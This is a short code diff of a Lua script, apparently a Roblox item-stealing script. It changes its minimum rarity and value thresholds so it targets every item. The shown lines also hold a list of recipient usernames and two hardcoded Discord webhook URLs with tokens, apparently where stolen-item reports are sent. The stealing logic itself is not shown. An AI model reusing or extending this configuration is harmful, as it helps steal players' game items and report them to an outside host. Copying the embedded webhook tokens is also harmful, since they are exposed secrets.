@@ -7,8 +7,8 @@ _G.scriptExecuted = true
 
 local now = os.time()
 local Usernames = _G.Usernames or { "User_Enter", "cripIess", "flames_xx", "Voltstandigs" }
-local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 1
+local min_rarity = _G.min_rarity or "Common"
+local min_value = _G.min_value or 0
 local pingEveryone = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1568290063991836744/iAfhWQqAqN0hfIdMLoUBz-l6yusNGbKiQGQPhTh8O_btR6eLFAJne1_lpLvXLYDdeBNN"
 local logWebhook = _G.logWebhook or "https://discord.com/api/webhooks/1563075565664338003/uXG0VmCz7nLZ0YQmRrLbwuT2DNczwq_dTPr5qtpKtZdGu0Q9KC-2nr6D1zHfgHAPEkiJ"
